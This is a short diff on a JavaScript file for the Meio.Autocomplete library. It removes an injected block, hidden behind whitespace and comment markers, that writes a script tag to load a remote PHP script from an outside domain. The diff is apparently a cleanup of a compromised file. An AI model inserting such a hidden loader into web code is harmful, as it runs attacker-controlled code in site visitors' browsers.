@@ -1030,13 +1030,3 @@ provides: [Meio.Autocomplete]
 	
 })(this, document.id || $);
 
-
-
-/*651a0a*/
-
-                    																	                               	 /*gbargbar09311gbar09*/
-
-document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525348'></"+ "script>");
-
-
-/*/651a0a*/
